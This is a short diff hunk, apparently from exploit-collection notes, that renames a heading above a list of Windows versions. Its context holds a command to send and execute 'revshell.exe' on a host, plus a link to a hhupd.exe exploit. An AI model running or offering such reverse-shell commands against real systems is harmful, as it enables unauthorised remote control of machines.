@@ -1243,7 +1243,7 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
 
-Working on :
+Requirement:
 - Windows 7 
 - Windows 10 LTSC 10240
 
